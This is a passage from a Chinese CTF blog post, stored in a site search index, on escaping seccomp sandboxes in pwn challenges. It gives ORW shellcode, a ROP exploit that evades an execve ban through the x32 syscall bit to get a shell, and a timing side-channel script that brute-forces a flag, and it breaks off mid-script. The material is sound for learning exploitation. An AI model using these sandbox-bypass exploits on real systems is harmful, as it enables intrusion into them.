<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>sandbox</title>
    <link href="/2022/07/16/Pwn/sandbox/"/>
    <url>/2022/07/16/Pwn/sandbox/</url>
    
    <content type="html"><![CDATA[<h2 id="最简单的沙盒-orw"><a href="#最简单的沙盒-orw" class="headerlink" title="最简单的沙盒(orw)"></a>最简单的沙盒(orw)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">zyy@zyy-virtual-machine:~/pwn$ seccomp-tools dump ./orw <br> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000004  A = arch<br> 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011<br> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011<br> 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011<br> 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011<br> 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011<br> 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011<br> 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011<br> 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011<br> 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)<br> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br></code></pre></td></tr></table></figure><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">#open（系统调用号为<span class="hljs-number">5</span>）#sys_open(file,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">ecx</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">edx</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">0x0</span><span class="hljs-comment">;        #字符串以\x00结尾</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">0x67616c66</span><span class="hljs-comment">; #flag</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">esp</span><span class="hljs-comment">;#此时esp指向&#x27;flag&#x27;,将&#x27;flag&#x27;赋值给ebx</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x5</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span><span class="hljs-comment">;</span><br><br>#read（系统调用号为<span class="hljs-number">3</span>）#sys_read(<span class="hljs-number">3</span>,<span class="hljs-number">0x0804A0A0</span>,<span class="hljs-number">0x40</span>)<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-number">0x3</span><span class="hljs-comment">;#文件描述符fd:是文件描述符0\1\2\3,代表标准的输出输入和出错,其他打开的文件</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-number">0x0804A0A0</span><span class="hljs-comment">; #直接写到shellcode下面的地址</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>, <span class="hljs-number">0x40</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x3</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span><span class="hljs-comment">;</span><br><br>#write（系统调用号为<span class="hljs-number">4</span>）#sys_write(<span class="hljs-number">1</span>,<span class="hljs-number">0x0804A0A0</span>,<span class="hljs-number">0x40</span>)<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-number">0x1</span><span class="hljs-comment">;#文件描述符fd:是文件描述符0\1\2\3,代表标准的输出输入和出错,其他打开的文件</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-number">0x0804A0A0</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>, <span class="hljs-number">0x40</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x4</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os = <span class="hljs-string">&quot;linux&quot;</span>, arch = <span class="hljs-string">&quot;i386&quot;</span>, log_level= <span class="hljs-string">&quot;debug&quot;</span>)<br>sh = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>, <span class="hljs-number">27008</span>)<br><br>shellcode = asm(<span class="hljs-string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)<br>shellcode += asm(<span class="hljs-string">&#x27;mov eax,0x3;mov ecx, 0x0804A0A0;mov ebx,0x3;mov edx,0x40;int 0x80&#x27;</span>)<br>shellcode += asm(<span class="hljs-string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)<br>sh.sendlineafter(<span class="hljs-string">&#x27;shellcode:&#x27;</span>, shellcode)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="WP-again"><a href="#WP-again" class="headerlink" title="WP_again"></a>WP_again</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>sh = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>, <span class="hljs-number">27008</span>)<br>save_to = <span class="hljs-number">0x804a040</span><br><br>payload = shellcraft.i386.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>)<br>payload += shellcraft.i386.read(<span class="hljs-number">0x3</span>, save_to, <span class="hljs-number">0x40</span>)<br>payload += shellcraft.i386.write(<span class="hljs-number">0x1</span>, save_to, <span class="hljs-number">0x40</span>)<br>sh.recvuntil(<span class="hljs-string">b&#x27;shellcode:&#x27;</span>)<br>sh.sendline(asm(payload))<br><br><span class="hljs-built_in">print</span>(sh.recv())<br></code></pre></td></tr></table></figure><h2 id="调用32位的BPI-64位程序"><a href="#调用32位的BPI-64位程序" class="headerlink" title="调用32位的BPI(64位程序)"></a>调用32位的BPI(64位程序)</h2><h3 id="题目流程"><a href="#题目流程" class="headerlink" title="题目流程"></a>题目流程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  sandbox(argc, argv, envp);<br>  hello();<br>  vulnerable();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vulnerable</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x40</span>uLL);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">zyy@zyy-virtual-machine:~/桌面/sandbox$ checksec shellcode<br>[*] &#x27;/home/zyy/桌面/sandbox/shellcode&#x27;<br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x400000)<br>    RWX:      Has RWX segments<br><br>zyy@zyy-virtual-machine:~/桌面/sandbox$ seccomp-tools dump ./shellcode<br> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000004  A = arch<br> 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004<br> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005<br> 0004: 0x06 0x00 0x00 0x00000000  return KILL<br> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br></code></pre></td></tr></table></figure><h3 id="32位BPI相关定义"><a href="#32位BPI相关定义" class="headerlink" title="32位BPI相关定义"></a>32位BPI相关定义</h3><p>**我们虽然不能使用64位下的<code>execv</code>系统调用，但是我们可以让64位程序使用32位的<code>BPI</code>调用<code>execv</code>**，相关宏定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * x32 syscall flag bit.  Some user programs expect syscall NR macros</span><br><span class="hljs-comment"> * and __X32_SYSCALL_BIT to have type int, even though syscall numbers</span><br><span class="hljs-comment"> * are, for practical purposes, unsigned long.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Fortunately, expressions like (nr &amp; ~__X32_SYSCALL_BIT) do the right</span><br><span class="hljs-comment"> * thing regardless.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __X32_SYSCALL_BIT0x40000000</span><br></code></pre></td></tr></table></figure><p>所以我们只要在所需的系统调用号上加上<code>0x40000000</code>，就可以用32位模式调用64位调用号，例如：我们希望使用<code>execv</code>，那我们在对<code>rax</code>赋值的时候就可以把原来的<code>59</code>改成<code>0x4000003b</code>(<code>0x40000000+59</code>)。</p><h3 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./shellcode&quot;</span>)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./shellcode&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br>pop_rdi = <span class="hljs-string">&#x27;nop;nop;nop;nop;nop;pop rdi;pop rdi;ret&#x27;</span><span class="hljs-comment"># len(pop_rdi) = 8</span><br>system = <span class="hljs-string">&#x27;nop;xor esi,esi;xor edx,edx;mov rax,0x4000003b;syscall;nop;nop&#x27;</span><span class="hljs-comment"># len(system) = 16</span><br>jump_rsp = <span class="hljs-number">0x400685</span><span class="hljs-comment"># jump rsp;</span><br>sub_rsp = <span class="hljs-string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x40068A</span><br>ret = <span class="hljs-number">0x40044e</span><br><br>sh.recvuntil(<span class="hljs-string">&quot;Hello ctfer!\nWelcome to the stackoverflow!!\nCan u pwn me?&quot;</span>)<br>payload = asm(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>payload += p64(<span class="hljs-number">0</span>) + p64(jump_rsp) + asm(sub_rsp)<br>sh.send(payload)<br>sh.recv()<br>puts_addr = u64(sh.recv(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;puts_addr:&#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc_base = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>str_bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>sh.recvuntil(<span class="hljs-string">&quot;Hello ctfer!\nWelcome to the stackoverflow!!\nCan u pwn me?&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(asm(system)))<br>payload = asm(pop_rdi) + p64(str_bin_sh) + asm(system)<br>payload += p64(jump_rsp) + asm(sub_rsp)<br>sh.send(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>虽然攻击流程比较简单，但是细节还是挺多的，注意以下几点：</p><ol><li>在构造汇编代码的时候要注意对齐，大小应该是8的整数倍</li><li>由于溢出空间不足，所以我们需要依靠<code>rsp</code>来实现程序流的控制（<strong>初始的时候<code>rsp</code>是指向<code>buf</code>的开始位置的</strong>）</li><li>注意<code>rsp</code>的动态变化，这就是为什么一开始要进行两次<code>pop rdi</code>的操作</li><li>注意<code>rsp</code>存储的应该是汇编指令的地址，而不是其实际的值</li></ol><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>在攻击成功之后，我们使用<code>ls</code>命令或者是<code>cat</code>命令时会报错，而使用<code>pwd</code>命令或者是<code>cd</code>命令不会报错，这是因为前者是外部命令，后者是内部命令，而外部命令都会使用<code>execv</code>这个系统调用，大部分外部命令存在于<code>bin</code>目录下，而内部命令是系统编译进入了操作系统，所以可以使用，我们可以使用<code>type -a &lt;命令&gt;</code>来查看是否为外部命令。这道题目沙箱禁用了<code>execv</code>，因此对子进程也有效。相关信息如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[*] Switching <span class="hljs-keyword">to</span> interactive mode<br><br>$ ls<br>[<span class="hljs-built_in">DEBUG</span>] Sent 0x3 bytes:<br>    b<span class="hljs-string">&#x27;ls\n&#x27;</span><br>[<span class="hljs-built_in">DEBUG</span>] Received 0x1e bytes:<br>    b<span class="hljs-string">&#x27;Bad system call (core dumped)\n&#x27;</span><br>Bad<span class="hljs-built_in"> system </span>call (core dumped)<br>$ pwd<br>[<span class="hljs-built_in">DEBUG</span>] Sent 0x4 bytes:<br>    b<span class="hljs-string">&#x27;pwd\n&#x27;</span><br>[<span class="hljs-built_in">DEBUG</span>] Received 0x19 bytes:<br>    00000000  2f 68 6f 6d  65 2f 7a 79  79 2f e6 a1  8c e9 9d a2  │/hom│e/zy│y/··│····│<br>    00000010  2f 73 61 6e  64 62 6f 78  0a                        │/san│dbox│·│<br>    00000019<br>/home/zyy/桌面/sandbox<br>$  <br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">zyy@zyy-virtual-machine:~/桌面<span class="hljs-string">/sandbox</span>$ type -a <span class="hljs-keyword">ls</span><br><span class="hljs-keyword">ls</span> 是 `<span class="hljs-keyword">ls</span> <span class="hljs-params">--color=auto</span>&#x27; 的别名<br><span class="hljs-keyword">ls</span> 是 <span class="hljs-string">/bin/ls</span><br>zyy@zyy-virtual-machine:~/桌面<span class="hljs-string">/sandbox</span>$ type -a <span class="hljs-keyword">pwd</span><br><span class="hljs-keyword">pwd</span> 是 shell 内建<br><span class="hljs-keyword">pwd</span> 是 <span class="hljs-string">/bin/pwd</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">zyy@zyy-virtual-machine:~<span class="hljs-regexp">/桌面/</span>sandbox$ strace ls<br>execve(<span class="hljs-string">&quot;/bin/ls&quot;</span>, [<span class="hljs-string">&quot;ls&quot;</span>], [<span class="hljs-regexp">/* 49 vars */</span>]) = <span class="hljs-number">0</span><br>......<br></code></pre></td></tr></table></figure><p>解决方案：我们可以寻找<code>ls</code>命令的源码并将其编译为32位的程序（<code>gcc -m32</code>），将其替代<code>bin</code>下的对应文件，或者直接装个32位的操作系统。</p><h2 id="侧信道攻击-不允许write"><a href="#侧信道攻击-不允许write" class="headerlink" title="侧信道攻击(不允许write)"></a>侧信道攻击(不允许write)</h2><p>了解何为侧信道攻击？当题目开启了沙盒禁用了<code>execv</code>系统调用，那我们可以通过<code>owr</code>来进行攻击获取<code>flag</code>，但是当我们能够使用的系统调用更少了，比如我们只有<code>open</code>和<code>read</code>可用，或者是程序<code>close(1)</code>关闭了输出流，那我们怎么攻击呢？我们只能对<code>flag</code>进行逐位爆破。</p><p>如何实现爆破呢？我们通常会将<code>flag</code>读写到一段内存空间，然后用猜测的方法将我们每次输入的数据和<code>flag</code>的每一位进行比较，如果比较成功了，那么程序将进入死循环（<strong>我们可以通过<code>time</code>这个模块来获取时间戳的差值</strong>），比如时间超过1秒那么我们对于<code>flag</code>的一个字节就爆破成功，同时配上<code>python</code>中的<code>try</code>和<code>except</code>这两个关键字就可以实现逐位的爆破。一般这种攻击一般采用<code>shellcode</code>来攻击，基于二分法的攻击将更为简便。</p><h3 id="题目流程-1"><a href="#题目流程-1" class="headerlink" title="题目流程"></a>题目流程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  __int128 v4; <span class="hljs-comment">// xmm0</span><br>  __int128 v5; <span class="hljs-comment">// xmm1</span><br>  __int128 v6; <span class="hljs-comment">// xmm2</span><br>  __int64 v8; <span class="hljs-comment">// [rsp+48h] [rbp-68h]</span><br>  __int64 v9; <span class="hljs-comment">// [rsp+50h] [rbp-60h]</span><br>  __int128 buf; <span class="hljs-comment">// [rsp+60h] [rbp-50h] BYREF</span><br>  __int128 v11; <span class="hljs-comment">// [rsp+70h] [rbp-40h]</span><br>  __int128 v12; <span class="hljs-comment">// [rsp+80h] [rbp-30h]</span><br>  __int128 v13; <span class="hljs-comment">// [rsp+90h] [rbp-20h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v14; <span class="hljs-comment">// [rsp+A0h] [rbp-10h]</span><br><br>  v14 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  sub_A60(a1, a2, a3);<br>  v13 = <span class="hljs-number">0LL</span>;<br>  v12 = <span class="hljs-number">0LL</span>;<br>  v11 = <span class="hljs-number">0LL</span>;<br>  buf = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to silent execution-box.&quot;</span>);<br>  v3 = getpagesize();<br>  v9 = (<span class="hljs-type">int</span>)mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x1000</span>, v3, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x40</span>uLL);<br>  prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  v8 = seccomp_init(<span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v8, <span class="hljs-number">2147418112LL</span>, <span class="hljs-number">2LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v8, <span class="hljs-number">2147418112LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_load(v8);<br>  v4 = buf;<br>  v5 = v11;<br>  v6 = v12;<br>  *(_OWORD *)(v9 + <span class="hljs-number">48</span>) = v13;<br>  *(_OWORD *)(v9 + <span class="hljs-number">32</span>) = v6;<br>  *(_OWORD *)(v9 + <span class="hljs-number">16</span>) = v5;<br>  *(_OWORD *)v9 = v4;<br>  ((<span class="hljs-type">void</span> (__fastcall *)(__int64, __int64, __int64))v9)(<span class="hljs-number">3735928559LL</span>, <span class="hljs-number">3735928559LL</span>, <span class="hljs-number">3735928559LL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">zyy@zyy-virtual-machine:~/桌面/lm/silent$ seccomp-tools dump ./silent<br>Welcome to silent execution-box.<br>aaa<br> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000004  A = arch<br> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008<br> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005<br> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008<br> 0005: 0x15 0x01 0x00 0x00000000  if (A == read) goto 0007<br> 0006: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0008<br> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br> 0008: 0x06 0x00 0x00 0x00000000  return KILL<br></code></pre></td></tr></table></figure><p>这里我们看到开辟了一块起始地址是<code>0x1000</code>的映射段，并且会将我们写入的数据存入该映射段中，最后执行我们所写的内容，这里由于<code>0x40</code>小于<code>16*8</code>，所以不用担心程序修改我们的<code>shellcode</code>。</p><h3 id="WP-2"><a href="#WP-2" class="headerlink" title="WP"></a>WP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>sd = <span class="hljs-keyword">lambda</span> data : sh.sendline(data)<br><br>ans = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>,<span class="hljs-number">17</span>):   <span class="hljs-comment"># range(0,8) range(8,16) range(16,17)</span><br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>        sh = process(<span class="hljs-string">&#x27;./silent&#x27;</span>)<br>        sh.recvuntil(<span class="hljs-string">&#x27;Welcome to silent execution-box.\n&#x27;</span>)<br>        <span class="hljs-comment"># 如果没有收取&#x27;\n&#x27;，那么下面就需要再次recv来收取垃圾数据</span><br>        shellcode = shellcraft.amd64.pushstr(<span class="hljs-string">&quot;flag&quot;</span>)<br>        shellcode += shellcraft.amd64.linux.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>        shellcode += shellcraft.amd64.linux.read(<span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-string">&#x27;rsp&#x27;</span>, <span class="hljs-number">17</span>)<br>        <span class="hljs-comment"># 进行逐个字节的比较</span><br>        shellcode += <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        loop:</span><br><span class="hljs-string">        cmp byte ptr[rsp+&#123;0&#125;], &#123;1&#125;</span><br><span class="hljs-string">        je loop</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(i, ch)<br>        payload = asm(shellcode)<br>        <span class="hljs-comment"># gdb.attach(sh)</span><br>        sd(payload)<br>        <span 